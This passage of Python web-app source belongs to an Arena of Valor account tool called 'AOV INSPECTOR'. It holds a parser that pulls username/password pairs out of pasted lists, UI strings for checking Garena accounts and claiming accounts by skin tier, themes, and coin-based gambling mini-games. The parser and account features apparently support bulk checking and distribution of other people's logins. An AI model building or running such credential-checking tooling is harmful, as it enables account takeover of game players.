        line = re.sub(r'^[\s•\-\*→>●○■□◆◇★☆✓✔✗✘❤♡💚💙🔥⚡]+', '', line)
        line = re.sub(r'^\s*\[?\d+\]?\s*[.)\]/\-:]?\s+', '', line)
        line = re.sub(r'[\U0001F300-\U0001F9FF\u2600-\u27BF]+', ' ', line).strip()
        line = line.strip('"\'`')
        # 🆕 v7.0 FIX: 3 thay vì 5 (cho phép acc ngắn như "a|b")
        if not line or len(line) < 4: continue  # 🔧 FIX: min 4
        parsed = None
        m = re.search(r'=\s*([A-Za-z0-9_.@+\-]{3,})\s*[:|]\s*([^\s|]{3,})', line)
        if m:
            u = m.group(1).strip(); p = m.group(2).strip().rstrip('|').strip()
            if u.upper() not in ("FINAL","FULL","ACC","NAME","USER","PASS"):
                if u and p and len(u) >= 3 and len(p) >= 3: parsed = (u, p)
        if not parsed:
            m3 = re.search(r'(?:TK|User|Username|Acc|Account|Tài\s*khoản)\s*[:=]\s*([A-Za-z0-9_.@+\-]{3,})\s*[|,\s]\s*(?:MK|Pass|Password|Mật\s*khẩu)\s*[:=]\s*([^\s|,]{3,})', line, re.IGNORECASE)
            if m3:
                u = m3.group(1).strip(); p = m3.group(2).strip()
                if u and p: parsed = (u, p)
        if not parsed:
            seps = [separator] if (separator and separator != "auto") else ["|","\t",":"," - "," ",",","=",";"]
            for sep in seps:
                if sep in line:
                    parts = line.split(sep, 1)
                    if len(parts) == 2:
                        u = parts[0].strip().strip('"\'`'); p = parts[1].strip().strip('"\'`')
                        if not u or not p: continue
                        if len(u) < 2 or len(p) < 3: continue
                        if '  ' in p: continue
                        if u.lower() in ('http','https','www','url','link','note','ghi','chu'): continue
                        if p.lower() in ('http','https','www','url','link'): continue
                        parsed = (u, p); break
        # 🔧 FIX: Lọc false positive (URL, domain, comment, header rác)
        if parsed:
            u, p = parsed
            # Loại nếu user/pass chứa pattern URL
            if re.search(r'https?://|www\.|\.[a-z]{2,4}(/|$)', u, re.I):
                continue
            if re.search(r'https?://|www\.', p, re.I):
                continue
            # Loại nếu user hoặc pass giống keyword hệ thống
            sys_kw = {'username','password','user','pass','account','acc',
                      'tài','khoản','mật','khẩu','login','signin','email'}
            if u.lower() in sys_kw or p.lower() in sys_kw:
                continue
            # Loại nếu user/pass toàn ký tự đặc biệt
            if not re.search(r'[A-Za-z0-9]', u):
                continue
            if not re.search(r'[A-Za-z0-9]', p):
                continue
            # Loại nếu user == pass (thường là rác)
            if u == p and len(u) < 6:
                continue
            accs.append(parsed)
    return accs

# ═══════════════════════════════════════════════════════════════════
#  🌐 i18n — ĐA NGÔN NGỮ
# ═══════════════════════════════════════════════════════════════════
TRANSLATIONS = {
    "vi": {
        "lang_name": "Tiếng Việt", "lang_flag": "🇻🇳",
        "menu_check": "Check", "menu_nhan": "Nhận", "menu_file": "File",
        "menu_loc": "Lọc", "menu_tao": "Tạo", "menu_lichsu": "L.Sử",
        "menu_chat": "Chat", "menu_tbao": "T.Báo", "menu_code": "Code",
        "menu_cnhan": "C.Nhân", "menu_upacc": "UP ACC", "menu_kho": "Kho",
        "menu_game": "Game", "menu_bxh": "BXH", "menu_huyhieu": "H.Hiệu",
        "menu_quest": "N.Vụ", "menu_voucher": "Voucher",
        "brand": "AOV INSPECTOR v7.0",
        "logout": "Thoát", "owner": "Chủ", "admin": "QTV",
        "login_title": "ĐĂNG NHẬP", "register_title": "ĐĂNG KÝ",
        "username": "Tên đăng nhập", "password": "Mật khẩu",
        "confirm_pw": "Xác nhận mật khẩu", "ref_code": "Mã người mời (tùy chọn)",
        "btn_login": "Đăng Nhập", "btn_register": "Đăng Ký",
        "btn_create": "Tạo Tài Khoản", "btn_submit": "Xác Nhận",
        "btn_copy": "📋 Copy", "btn_back": "← Quay Lại", "btn_cancel": "Hủy",
        "check_title": "Check Tài Khoản Garena",
        "check_account": "Tài khoản / Email / SĐT",
        "check_pw": "Mật khẩu",
        "check_balance": "Số dư", "check_cost": "Chi phí",
        "btn_start_check": "Bắt Đầu Quét Dữ Liệu",
        "slogan_1": "⚡ Nhanh · Chuẩn · Uy Tín #1 VN",
        "slogan_2": "🔥 Check Acc Liên Quân Miễn Phí",
        "slogan_3": "💎 Full Skin SSS · SS · Anime",
        "slogan_4": "🛡️ Bảo Mật · An Toàn · Chính Xác",
        "slogan_5": "🚀 Hệ Thống Check Acc Đỉnh Cao",
        "slogan_6": "🎯 Tỉ Lệ Chính Xác 99.9%",
        "slogan_7": "👑 Được Tin Dùng Bởi 10.000+ User",
        "theme_picker": "🎨 Chọn Phông Nền",
        "theme_current": "Đang dùng", "theme_apply": "Áp dụng",
        "game_hub": "🎮 TRUNG TÂM GAME", "game_play": "🎯 Chơi Ngay",
        "game_plays_today": "Lượt hôm nay", "game_max": "Tối đa",
        "game_win": "THẮNG", "game_lose": "THUA",
        "game_you_win": "Bạn nhận được", "game_you_lose": "Bạn mất",
        "game_balance": "Số dư", "game_history": "Lịch sử chơi",
        "game_no_history": "Chưa chơi game nào",
        "g1_name": "Vòng Quay May Mắn", "g1_desc": "10 xu/lần, tối đa 20 lượt/ngày, thưởng 0-500 xu",
        "g1_btn": "🎰 QUAY NGAY",
        "g2_name": "Tài Xỉu", "g2_desc": "Cược 5-100 xu, tối đa 30 lượt/ngày. Tài/Xỉu x2, Bão x5",
        "g2_btn": "🎲 LẮC XÚC XẮC",
        "g2_bet": "Số xu cược (5-100)", "g2_choice": "Chọn cửa",
        "g2_tai": "TÀI (11-18)", "g2_xiu": "XỈU (3-10)", "g2_bao": "BÃO (x5)",
        "g3_name": "Đập Hộp", "g3_desc": "20 xu/hộp, tối đa 15 lượt/ngày, thưởng 0-500 xu",
        "g3_btn": "📦 ĐẬP HỘP",
        "g4_name": "Lì Xì Miễn Phí", "g4_desc": "Miễn phí, 3 lần/ngày, thưởng 10-200 xu",
        "g4_btn": "🎁 MỞ LÌ XÌ",
        "g5_name": "Rồng Vàng", "g5_desc": "Cược 50/100/200 xu, tối đa 10 lượt/ngày, x10",
        "g5_btn": "🐉 NUÔI RỒNG", "g5_bet": "Mức cược",
        "g6_name": "🎰 Slot Machine", "g6_desc": "Cược 10-100, 3 reels, max x200, 30 lượt/ngày",
        "g6_btn": "🎰 QUAY SLOT",
        "game_not_enough": "Không đủ xu!", "game_out_of_turns": "Hết lượt hôm nay!",
        "game_won": "🎉 Chúc mừng! Bạn nhận",
        "game_lost": "😢 Rất tiếc! Bạn mất",
        "bxh_title": "🏆 BẢNG XẾP HẠNG GAME",
        "bxh_rank": "Hạng", "bxh_user": "Người chơi",
        "bxh_won": "Thắng lớn nhất", "bxh_total": "Tổng thắng",
        "bxh_plays": "Số lượt chơi",
        "chat_title": "💬 Tin Nhắn",
        "chat_room_public": "🌐 Phòng chung",
        "chat_room_support": "🆘 Tin nhắn riêng",
        "chat_room_admin": "👑 Phòng QTV",
        "chat_placeholder": "Nhập tin nhắn...", "chat_send": "Gửi",
        "yes": "Có", "no": "Không", "ok": "OK", "loading": "Đang tải...",
        "balance": "Số dư", "level": "Cấp độ", "role": "Vai trò",
        "copy_ok": "✓ Đã copy!",
        "badge_title": "🏅 HUY HIỆU",
        "badge_earned": "Đã đạt", "badge_locked": "Chưa đạt",
        "quest_title": "📋 NHIỆM VỤ NGÀY",
        "quest_progress": "Tiến độ", "quest_reward": "Thưởng",
        "quest_claim": "Nhận thưởng", "quest_claimed": "Đã nhận",
        "quest_incomplete": "Chưa xong",
        "streak_title": "📅 ĐIỂM DANH 7 NGÀY",
        "streak_current": "Chuỗi hiện tại", "streak_best": "Kỷ lục",
        "streak_today": "Điểm danh hôm nay",
        "streak_done": "Đã điểm danh hôm nay",
        "ad_title": "📺 XEM QUẢNG CÁO NHẬN XU",
        "ad_watch": "▶️ XEM QUẢNG CÁO (5s)",
        "ad_watching": "⏳ Đang xem...",
        "ad_done": "✓ Nhận thưởng!",
        "voucher_title": "🎫 VOUCHER",
        "voucher_apply": "Áp dụng",
        "voucher_empty": "Chưa có voucher",
        "accent_title": "🎨 MÀU CHỦ ĐẠO",
        "random_tier_title": "🎲 NHẬN ACC THEO TIER",
        "random_tier_sss": "⭐ SSS (8 xu)",
        "random_tier_ss": "💎 SS (3 xu)",
        "random_tier_anime": "🎴 Anime (5 xu)",
        "random_tier_normal": "○ Thường (1 xu)",
    },
    "en": {
        "lang_name": "English", "lang_flag": "🇬🇧",
        "menu_check": "Check", "menu_nhan": "Claim", "menu_file": "File",
        "menu_loc": "Filter", "menu_tao": "Create", "menu_lichsu": "History",
        "menu_chat": "Chat", "menu_tbao": "Notif", "menu_code": "Code",
        "menu_cnhan": "Profile", "menu_upacc": "UP ACC", "menu_kho": "Storage",
        "menu_game": "Game", "menu_bxh": "Rank", "menu_huyhieu": "Badges",
        "menu_quest": "Quest", "menu_voucher": "Voucher",
        "brand": "AOV INSPECTOR v7.0",
        "logout": "Logout", "owner": "Owner", "admin": "Admin",
        "login_title": "LOGIN", "register_title": "REGISTER",
        "username": "Username", "password": "Password",
        "confirm_pw": "Confirm password", "ref_code": "Referral code (optional)",
        "btn_login": "Login", "btn_register": "Register",
        "btn_create": "Create Account", "btn_submit": "Submit",
        "btn_copy": "📋 Copy", "btn_back": "← Back", "btn_cancel": "Cancel",
        "check_title": "Check Garena Account",
        "check_account": "Account / Email / Phone",
        "check_pw": "Password",
        "check_balance": "Balance", "check_cost": "Cost",
        "btn_start_check": "Start Scanning",
        "slogan_1": "⚡ Fast · Accurate · #1 Trusted",
        "slogan_2": "🔥 Free AoV Account Checker",
        "slogan_3": "💎 Full SSS · SS · Anime Skins",
        "slogan_4": "🛡️ Secure · Safe · Accurate",
        "slogan_5": "🚀 Ultimate Account Checking System",
        "slogan_6": "🎯 99.9% Accuracy Rate",
        "slogan_7": "👑 Trusted by 10,000+ Users",
        "theme_picker": "🎨 Choose Background",
        "theme_current": "Using", "theme_apply": "Apply",
        "game_hub": "🎮 GAME CENTER", "game_play": "🎯 Play Now",
        "game_plays_today": "Today's plays", "game_max": "Max",
        "game_win": "WIN", "game_lose": "LOSE",
        "game_you_win": "You received", "game_you_lose": "You lost",
        "game_balance": "Balance", "game_history": "Play history",
        "game_no_history": "No games played yet",
        "g1_name": "Lucky Wheel", "g1_desc": "10 coins/spin, max 20/day, reward 0-500",
        "g1_btn": "🎰 SPIN NOW",
        "g2_name": "Tai Xiu", "g2_desc": "Bet 5-100 coins, max 30/day. Tai/Xiu x2, Bao x5",
        "g2_btn": "🎲 ROLL DICE",
        "g2_bet": "Bet amount (5-100)", "g2_choice": "Choose side",
        "g2_tai": "TAI (11-18)", "g2_xiu": "XIU (3-10)", "g2_bao": "BAO (x5)",
        "g3_name": "Box Smash", "g3_desc": "20 coins/box, max 15/day, reward 0-500",
        "g3_btn": "📦 SMASH BOX",
        "g4_name": "Free Lucky Money", "g4_desc": "Free, 3/day, reward 10-200",
        "g4_btn": "🎁 OPEN RED ENVELOPE",
        "g5_name": "Golden Dragon", "g5_desc": "Bet 50/100/200 coins, max 10/day, x10",
        "g5_btn": "🐉 RAISE DRAGON", "g5_bet": "Bet level",
        "g6_name": "🎰 Slot Machine", "g6_desc": "Bet 10-100, 3 reels, max x200, 30/day",
        "g6_btn": "🎰 SPIN SLOT",
        "game_not_enough": "Not enough coins!", "game_out_of_turns": "Out of turns today!",
        "game_won": "🎉 Congrats! You received",
        "game_lost": "😢 Sorry! You lost",
        "bxh_title": "🏆 GAME LEADERBOARD",
        "bxh_rank": "Rank", "bxh_user": "Player",
        "bxh_won": "Biggest win", "bxh_total": "Total won",
        "bxh_plays": "Plays",
        "chat_title": "💬 Messages",
        "chat_room_public": "🌐 Public Room",
        "chat_room_support": "🆘 Private Message",
        "chat_room_admin": "👑 Admin Room",
        "chat_placeholder": "Type a message...", "chat_send": "Send",
        "yes": "Yes", "no": "No", "ok": "OK", "loading": "Loading...",
        "balance": "Balance", "level": "Level", "role": "Role",
        "copy_ok": "✓ Copied!",
        "badge_title": "🏅 BADGES",
        "badge_earned": "Earned", "badge_locked": "Locked",
        "quest_title": "📋 DAILY QUESTS",
        "quest_progress": "Progress", "quest_reward": "Reward",
        "quest_claim": "Claim", "quest_claimed": "Claimed",
        "quest_incomplete": "Incomplete",
        "streak_title": "📅 7-DAY CHECK-IN",
        "streak_current": "Current streak", "streak_best": "Best",
        "streak_today": "Check-in today",
        "streak_done": "Checked in today",
        "ad_title": "📺 WATCH AD FOR COINS",
        "ad_watch": "▶️ WATCH AD (5s)",
        "ad_watching": "⏳ Watching...",
        "ad_done": "✓ Claimed!",
        "voucher_title": "🎫 VOUCHERS",
        "voucher_apply": "Apply",
        "voucher_empty": "No vouchers",
        "accent_title": "🎨 ACCENT COLOR",
        "random_tier_title": "🎲 CLAIM BY TIER",
        "random_tier_sss": "⭐ SSS (8 coins)",
        "random_tier_ss": "💎 SS (3 coins)",
        "random_tier_anime": "🎴 Anime (5 coins)",
        "random_tier_normal": "○ Normal (1 coin)",
    },
}

def get_lang():
    u = get_user()
    if u and u.get("lang"): return u["lang"]
    return session.get("lang", "vi")

def t(key):
    lang = get_lang()
    return TRANSLATIONS.get(lang, TRANSLATIONS["vi"]).get(key, key)

def set_lang(lang):
    if lang not in TRANSLATIONS: lang = "vi"
    session["lang"] = lang; session.permanent = True
    u = get_user()
    if u:
        u["lang"] = lang
        save_data()

# ═══════════════════════════════════════════════════════════════════
#  🎨 THEMES — 12 PHÔNG NỀN VIỆT NAM
# ═══════════════════════════════════════════════════════════════════
THEMES = {
    "grid":    {"name_vi": "🌌 Cyber Grid",      "name_en": "🌌 Cyber Grid",      "css_class": "theme-grid"},
    "halong":  {"name_vi": "🏯 Vịnh Hạ Long",    "name_en": "🏯 Ha Long Bay",     "css_class": "theme-halong"},
    "lua":     {"name_vi": "🌾 Đồng Lúa Vàng",   "name_en": "🌾 Golden Rice",     "css_class": "theme-lua"},
    "hoian":   {"name_vi": "🏮 Phố Cổ Hội An",   "name_en": "🏮 Hoi An Town",     "css_class": "theme-hoian"},
    "rong":    {"name_vi": "🐉 Rồng Thăng Long", "name_en": "🐉 Thang Long Dragon","css_class": "theme-rong"},
    "bien":    {"name_vi": "🌊 Biển Nha Trang",  "name_en": "🌊 Nha Trang Sea",   "css_class": "theme-bien"},
    "sapa":    {"name_vi": "⛰️ Sa Pa Sương Mù",  "name_en": "⛰️ Sapa Mist",       "css_class": "theme-sapa"},
    "sen":     {"name_vi": "🌺 Hoa Sen Hồ Tây",  "name_en": "🌺 West Lake Lotus", "css_class": "theme-sen"},
    "phaphoa": {"name_vi": "🎆 Pháo Hoa Đà Nẵng","name_en": "🎆 Da Nang Fireworks","css_class": "theme-phaphoa"},
    "fansipan":{"name_vi": "🏔️ Fansipan Tuyết",  "name_en": "🏔️ Fansipan Snow",   "css_class": "theme-fansipan"},
    "saigon":  {"name_vi": "🌃 Sài Gòn Về Đêm",  "name_en": "🌃 Saigon Night",    "css_class": "theme-saigon"},
    "coviet":  {"name_vi": "🇻🇳 Cờ Đỏ Sao Vàng", "name_en": "🇻🇳 Vietnam Flag",   "css_class": "theme-coviet"},
}

THEME_CSS = """
body.theme-grid { background-image: radial-gradient(circle at 50% -10%,rgba(0,242,254,0.15) 0%,transparent 50%),radial-gradient(circle at 10% 30%,rgba(255,0,127,0.08) 0%,transparent 45%),radial-gradient(circle at 90% 70%,rgba(255,183,3,0.08) 0%,transparent 50%); }
body.theme-halong { background-image: linear-gradient(180deg,#0a5c5c 0%,#0d9488 30%,#06b6d4 60%,#0e7490 100%); background-attachment:fixed; }
body.theme-halong::before { content:''; position:fixed; inset:0; background:radial-gradient(ellipse at 30% 80%,rgba(0,0,0,0.5) 0%,transparent 40%),radial-gradient(ellipse at 70% 85%,rgba(0,0,0,0.6) 0%,transparent 35%); pointer-events:none; z-index:0; }
body.theme-lua { background-image: linear-gradient(180deg,#fef3c7 0%,#fcd34d 40%,#f59e0b 70%,#b45309 100%); background-attachment:fixed; }
body.theme-lua .card { background:linear-gradient(135deg,rgba(120,53,15,0.7),rgba(180,83,9,0.6)); border-color:rgba(255,215,0,0.3); }
body.theme-hoian { background-image: linear-gradient(180deg,#7f1d1d 0%,#dc2626 40%,#f59e0b 70%,#fbbf24 100%); background-attachment:fixed; }
body.theme-rong { background-image: linear-gradient(135deg,#7f1d1d 0%,#b91c1c 30%,#dc2626 50%,#f59e0b 80%,#fbbf24 100%); background-attachment:fixed; }
body.theme-bien { background-image: linear-gradient(180deg,#0c4a6e 0%,#0284c7 30%,#38bdf8 60%,#fde68a 90%,#fef3c7 100%); background-attachment:fixed; }
body.theme-sapa { background-image: linear-gradient(180deg,#374151 0%,#6b7280 35%,#9ca3af 60%,#d1d5db 85%,#f3f4f6 100%); background-attachment:fixed; }
body.theme-sen { background-image: linear-gradient(135deg,#831843 0%,#be185d 30%,#ec4899 50%,#22c55e 80%,#166534 100%); background-attachment:fixed; }
body.theme-phaphoa { background-image: radial-gradient(circle at 30% 40%,rgba(236,72,153,0.5) 0%,transparent 30%),radial-gradient(circle at 70% 30%,rgba(251,191,36,0.5) 0%,transparent 25%),radial-gradient(circle at 50% 70%,rgba(139,92,246,0.4) 0%,transparent 35%),linear-gradient(180deg,#020617 0%,#1e1b4b 100%); background-attachment:fixed; }
body.theme-fansipan { background-image: linear-gradient(180deg,#0f172a 0%,#1e293b 30%,#334155 60%,#94a3b8 85%,#e2e8f0 100%); background-attachment:fixed; }
body.theme-saigon { background-image: radial-gradient(circle at 20% 30%,rgba(168,85,247,0.4) 0%,transparent 40%),radial-gradient(circle at 80% 60%,rgba(236,72,153,0.4) 0%,transparent 40%),radial-gradient(circle at 50% 90%,rgba(59,130,246,0.3) 0%,transparent 50%),linear-gradient(180deg,#0f172a 0%,#4c1d95 50%,#831843 100%); background-attachment:fixed; }
body.theme-coviet { background-image: radial-gradient(circle at 50% 50%,rgba(255,215,0,0.15) 0%,transparent 40%),linear-gradient(180deg,#7f1d1d 0%,#b91c1c 50%,#dc2626 100%); background-attachment:fixed; }
body.theme-coviet::before { content:'★'; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); font-size:60vh; color:rgba(255,215,0,0.06); pointer-events:none; z-index:0; line-height:1; }
.theme-picker-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:10px; }
.theme-item { cursor:pointer; border-radius:12px; overflow:hidden; border:2px solid rgba(255,255,255,0.1); transition:all 0.3s; position:relative; aspect-ratio:1; }
.theme-item:hover { transform:scale(1.05); border-color:#00f2fe; box-shadow:0 0 15px rgba(0,242,254,0.5); }
.theme-item.active { border-color:#00ff88; box-shadow:0 0 20px rgba(0,255,136,0.7); }
.theme-item.active::after { content:'✓'; position:absolute; top:4px; right:4px; width:22px; height:22px; background:#00ff88; color:#000; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:800; font-size:13px; }
.theme-preview { width:100%; height:100%; }
.theme-label { position:absolute; bottom:0; left:0; right:0; background:rgba(0,0,0,0.75); color:#fff; font-size:10px; padding:4px; text-align:center; font-weight:700; letter-spacing:0.5px; }
@media (max-width:768px) { .theme-picker-grid { grid-template-columns:repeat(3,1fr); } }
/* 🆕 v7.0: Accent color */
body { --accent: #00f2fe; }
body[data-accent="cyan"] { --accent: #00f2fe; }
body[data-accent="pink"] { --accent: #ff007f; }
body[data-accent="gold"] { --accent: #ffb800; }
body[data-accent="green"] { --accent: #00ff88; }
body[data-accent="purple"] { --accent: #a855f7; }
body[data-accent="orange"] { --accent: #ff5500; }
body[data-accent="red"] { --accent: #ff2951; }
body[data-accent="blue"] { --accent: #38bdf8; }
.card-title i, .menu-btn.active .menu-icon { color: var(--accent); }
.btn { background: linear-gradient(135deg, var(--accent), #4facfe); }
.app-logo-icon { background: linear-gradient(135deg, var(--accent), #4facfe, #6b21a8); }
/* 🆕 v7.0: Badge styles */
.badge-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(140px,1fr)); gap:12px; }
.badge-item { background:linear-gradient(135deg,rgba(13,22,42,0.7),rgba(0,242,254,0.02)); border:2px solid rgba(0,242,254,0.15); border-radius:14px; padding:14px; text-align:center; transition:all 0.3s; position:relative; }
.badge-item.earned { border-color:#ffb800; background:linear-gradient(135deg,rgba(255,183,3,0.15),rgba(255,183,3,0.02)); box-shadow:0 0 20px rgba(255,183,3,0.3); }
.badge-item.locked { opacity:0.5; filter:grayscale(0.8); }
.badge-icon { font-size:2.5em; margin-bottom:8px; }
.badge-name { font-family:var(--font-display); font-size:0.82em; font-weight:800; color:#ffb800; margin-bottom:4px; }
.badge-desc { font-size:0.7em; color:var(--text-dim); line-height:1.3; }
/* 🆕 v7.0: Quest */
.quest-item { background:linear-gradient(135deg,rgba(13,22,42,0.6),rgba(0,242,254,0.03)); border:1px solid rgba(0,242,254,0.15); border-radius:14px; padding:14px; margin-bottom:10px; }
.quest-item.done { border-color:#00ff88; background:linear-gradient(135deg,rgba(0,255,136,0.08),rgba(0,255,136,0.02)); }
.quest-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:8px; gap:8px; }
.quest-name { font-family:var(--font-display); font-weight:700; font-size:0.9em; }
.quest-progress-bar { height:8px; background:rgba(5,8,17,0.8); border-radius:8px; overflow:hidden; margin-bottom:8px; }
.quest-progress-fill { height:100%; background:linear-gradient(90deg,#00f2fe,#00ff88); transition:width 0.5s; border-radius:8px; }
/* 🆕 v7.0: Streak */
.streak-grid { display:grid; grid-template-columns:repeat(7,1fr); gap:6px; margin:14px 0; }
.streak-day { aspect-ratio:1; background:rgba(5,8,17,0.6); border:2px solid rgba(0,242,254,0.15); border-radius:10px; display:flex; flex-direction:column; align-items:center; justify-content:center; font-size:0.7em; color:var(--text-dim); transition:all 0.3s; }
.streak-day.done { background:linear-gradient(135deg,#ffb800,#ff8800); color:#000; border-color:#ffb800; font-weight:800; }
.streak-day.current { border-color:#00ff88; box-shadow:0 0 15px rgba(0,255,136,0.5); }
.streak-day .icon { font-size:1.4em; margin-bottom:2px; }
.streak-day .reward { font-weight:700; }
/* 🆕 v7.0: Slot reels */
.slot-machine { background:linear-gradient(135deg,rgba(255,183,3,0.15),rgba(255,0,127,0.1)); border:2px solid #ffb800; border-radius:20px; padding:20px; text-align:center; margin:14px 0; }
.slot-reels { display:flex; justify-content:center; gap:12px; margin:20px 0; }
.slot-reel { width:80px; height:80px; background:linear-gradient(135deg,#0a101f,#050811); border:3px solid #ffb800; border-radius:14px; display:flex; align-items:center; justify-content:center; font-size:2.5em; box-shadow:inset 0 0 20px rgba(255,183,3,0.3); }
@media (max-width:768px) { .slot-reel { width:60px; height:60px; font-size:2em; } }
/* 🆕 v7.0: Ad */
.ad-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:99999; display:flex; align-items:center; justify-content:center; flex-direction:column; gap:20px; padding:20px; }
.ad-countdown { font-family:var(--font-display); font-size:4em; font-weight:900; color:#00f2fe; text-shadow:0 0 30px #00f2fe; }
/* 🆕 LED animation cho loading steps */
#loading-steps > div { transition: all 0.4s ease; }
#loading-steps > div.step-active {
    animation: stepBlink 1s ease-in-out infinite;
    padding-left: 6px;
    border-left: 2px solid #00f2fe;
}
@keyframes stepBlink {
    0%, 100% { opacity: 1; text-shadow: 0 0 8px #00f2fe; }
    50% { opacity: 0.6; text-shadow: 0 0 20px #00f2fe, 0 0 30px #00f2fe; }
}
"""

def get_background():
    u = get_user()
    if u and u.get("background"): return u["background"]
    return "grid"

def set_background(bg_id):
    if bg_id not in THEMES: bg_id = "grid"
    u = get_user()
    if u:
        u["background"] = bg_id
        save_data()
    session["background"] = bg_id

def get_accent():
    u = get_user()
    if u and u.get("accent") and u["accent"] in ACCENT_COLORS: return u["accent"]
    return "cyan"

def set_accent(accent_id):
    if accent_id not in ACCENT_COLORS: accent_id = "cyan"
    u = get_user()
    if u:
        u["accent"] = accent_id
        save_data()

# ═══════════════════════════════════════════════════════════════════
#  🎮 GAME ENGINE
# ═══════════════════════════════════════════════════════════════════
GAME_CONFIGS = {
    "vongquay": {"name_key": "g1_name", "desc_key": "g1_desc", "cost": 10, "max_daily": 20, "icon": "🎰", "color": "#ffb800"},
    "taixiu":   {"name_key": "g2_name", "desc_key": "g2_desc", "cost": 0,  "max_daily": 30, "icon": "🎲", "color": "#00f2fe"},
    "daphop":   {"name_key": "g3_name", "desc_key": "g3_desc", "cost": 20, "max_daily": 15, "icon": "📦", "color": "#e040fb"},
    "lixi":     {"name_key": "g4_name", "desc_key": "g4_desc", "cost": 0,  "max_daily": 3,  "icon": "🎁", "color": "#00ff88"},
    "rongvang": {"name_key": "g5_name", "desc_key": "g5_desc", "cost": 50, "max_daily": 10, "icon": "🐉", "color": "#ff2951"},
    # 🆕 v7.0
    "slot":     {"name_key": "g6_name", "desc_key": "g6_desc", "cost": 0,  "max_daily": 30, "icon": "🎰", "color": "#ff007f"},
}

def _reset_game_daily_if_needed(user):
    today = datetime.now().strftime("%Y-%m-%d")
    gd = user.get("game_daily", {})
    if gd.get("date") != today:
        user["game_daily"] = {"date": today, "vongquay": 0, "taixiu": 0, "daphop": 0, "lixi": 0, "rongvang": 0, "slot": 0}

def _can_play(user, game_id):
    _reset_game_daily_if_needed(user)
    cfg = GAME_CONFIGS.get(game_id)
    if not cfg: return False, "Game không tồn tại"
    played = user["game_daily"].get(game_id, 0)
    if played >= cfg["max_daily"]:
        return False, t("game_out_of_turns")
    return True, "OK"

def _log_game_result(user, game_id, bet, win_amount, detail=""):
    entry = {"id": uuid.uuid4().hex[:10], "game": game_id,
             "bet": bet, "win": win_amount, "delta": win_amount - bet,
             "detail": detail, "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
             "timestamp": time.time()}
    user.setdefault("game_history", []).append(entry)
    user["game_history"] = user["game_history"][-100:]
    stats = user.setdefault("game_stats", {"total_play": 0, "total_win": 0, "total_lose": 0,
                                            "biggest_win": 0, "total_won_xu": 0, "total_lost_xu": 0})
    stats["total_play"] += 1
    if win_amount > bet:
        stats["total_win"] += 1
        stats["total_won_xu"] += (win_amount - bet)
        if win_amount > stats.get("biggest_win", 0):
            stats["biggest_win"] = win_amount
    elif win_amount < bet:
        stats["total_lose"] += 1
        stats["total_lost_xu"] += (bet - win_amount)
    # 🆕 v7.0: Update quest progress
    quest_add_progress(user, "game_play", 1)
    if game_id == "taixiu" and win_amount > bet:
        quest_add_progress(user, "taixiu_win", 1)
    if game_id == "vongquay":
        quest_add_progress(user, "vongquay_play", 1)

def play_vongquay(user):
    ok, msg = _can_play(user, "vongquay")
    if not ok: return {"success": False, "error": msg}
    cost = GAME_CONFIGS["vongquay"]["cost"]
    if user.get("balance", 0) < cost:
        return {"success": False, "error": t("game_not_enough")}
    user["balance"] -= cost
    user["game_daily"]["vongquay"] = user["game_daily"].get("vongquay", 0) + 1
    roll = random.random()
    if roll < 0.30:   win = 0
    elif roll < 0.55: win = random.randint(10, 50)
    elif roll < 0.75: win = random.randint(50, 100)
    elif roll < 0.90: win = random.randint(100, 200)
    elif roll < 0.98: win = random.randint(200, 300)
    else:             win = random.randint(300, 500)
    if win > 0: user["balance"] += win
    _log_game_result(user, "vongquay", cost, win, f"Quay được {win} xu")
    save_data()
    return {"success": True, "game": "vongquay", "bet": cost, "win": win,
            "delta": win - cost, "balance": user["balance"],
            "remaining": GAME_CONFIGS["vongquay"]["max_daily"] - user["game_daily"]["vongquay"],
            "message": f"{t('game_won')} {win} xu!" if win > 0 else f"{t('game_lost')} {cost} xu!"}

def play_taixiu(user, bet, choice):
    ok, msg = _can_play(user, "taixiu")
    if not ok: return {"success": False, "error": msg}
    try: bet = int(bet)
    except: return {"success": False, "error": "Số xu không hợp lệ!"}
    if bet < 5 or bet > 100:
        return {"success": False, "error": "Cược từ 5-100 xu!"}
    if user.get("balance", 0) < bet:
        return {"success": False, "error": t("game_not_enough")}
    if choice not in ("tai", "xiu"):
        return {"success": False, "error": "Chọn Tài hoặc Xỉu!"}
    user["balance"] -= bet
    user["game_daily"]["taixiu"] = user["game_daily"].get("taixiu", 0) + 1
    d1, d2, d3 = random.randint(1,6), random.randint(1,6), random.randint(1,6)
    total = d1 + d2 + d3
    is_bao = (d1 == d2 == d3)
    result_side = "bao" if is_bao else ("tai" if total >= 11 else "xiu")
    if is_bao:
        win = bet * 5
    elif choice == result_side:
        win = bet * 2
    else:
        win = 0
    if win > 0: user["balance"] += win
    detail = f"Xúc xắc: {d1}+{d2}+{d3}={total} — {result_side.upper()}"
    _log_game_result(user, "taixiu", bet, win, detail)
    save_data()
    return {"success": True, "game": "taixiu", "bet": bet, "win": win,
            "delta": win - bet, "balance": user["balance"],
            "dice": [d1, d2, d3], "total": total, "result": result_side,
            "is_bao": is_bao,
            "remaining": GAME_CONFIGS["taixiu"]["max_daily"] - user["game_daily"]["taixiu"],
            "message": f"{t('game_won')} {win} xu!" if win > bet else (f"Hòa! Bạn nhận lại {win} xu" if win == bet else f"{t('game_lost')} {bet} xu!")}

def play_daphop(user):
    ok, msg = _can_play(user, "daphop")
    if not ok: return {"success": False, "error": msg}
    cost = GAME_CONFIGS["daphop"]["cost"]
    if user.get("balance", 0) < cost:
        return {"success": False, "error": t("game_not_enough")}
    user["balance"] -= cost
    user["game_daily"]["daphop"] = user["game_daily"].get("daphop", 0) + 1
    roll = random.random()
    if roll < 0.35:   win = 0
    elif roll < 0.60: win = random.randint(10, 50)
    elif roll < 0.80: win = random.randint(50, 150)
    elif roll < 0.95: win = random.randint(150, 300)
    else:             win = random.randint(300, 500)
    if win > 0: user["balance"] += win
    _log_game_result(user, "daphop", cost, win, f"Mở hộp được {win} xu")
    save_data()
    return {"success": True, "game": "daphop", "bet": cost, "win": win,
            "delta": win - cost, "balance": user["balance"],
            "remaining": GAME_CONFIGS["daphop"]["max_daily"] - user["game_daily"]["daphop"],
